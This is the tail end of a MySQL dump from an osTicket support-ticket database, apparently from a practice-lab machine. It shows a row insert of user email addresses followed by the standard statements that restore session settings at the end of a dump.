INSERT INTO `ost_user_email` VALUES (1,1,0,'support@osticket.com'),(2,2,0,'lol@test.com'),(3,3,0,'9ecfb4be145d47fda0724f697f35ffaf@mail.htb'),(4,4,0,'c3ecacacc7b94f909d04dbfd308a9b93@mail.htb'),(5,5,0,'ff0a21fc6fc2488195e16ea854c963ee@mail.htb'),(6,6,0,'5b785171bfb34762a933e127630c4860@mail.htb'),(7,7,0,'saint1@10.10.16.6'),(8,8,0,'test@test.de'),(9,9,0,'hack@hack.de'),(10,10,0,'test@delivery.htb'),(11,11,0,'hacker@shell.gov');
/*!40000 ALTER TABLE `ost_user_email` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2021-01-30 17:18:49
